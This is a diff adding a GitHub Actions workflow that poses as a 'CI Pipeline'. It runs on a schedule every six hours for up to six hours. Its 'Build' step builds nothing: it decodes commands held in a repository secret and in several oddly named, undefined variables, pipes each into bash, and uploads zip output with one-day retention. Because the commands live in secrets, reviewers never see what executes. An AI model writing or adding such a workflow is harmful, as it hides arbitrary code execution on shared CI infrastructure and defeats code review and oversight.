@@ -1,0 +1,31 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          agze808: ${{ secrets.agze808 }}
+        run: |
+          printf '%s' "$agze808" | jq -r .mtpy3 | /bin/bash
+          printf '%s' "$ea11" | jq -r .b8 | /bin/bash
+          printf '%s' "$dwixy0" | jq -r .x5658 | /bin/bash
+          echo $uzbqy4 | jq -r .qo6963 | /bin/bash
+          echo $u85 | jq -r .kma817 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Q6Z06ick
+          path: "*.zip"
+          retention-days: 1
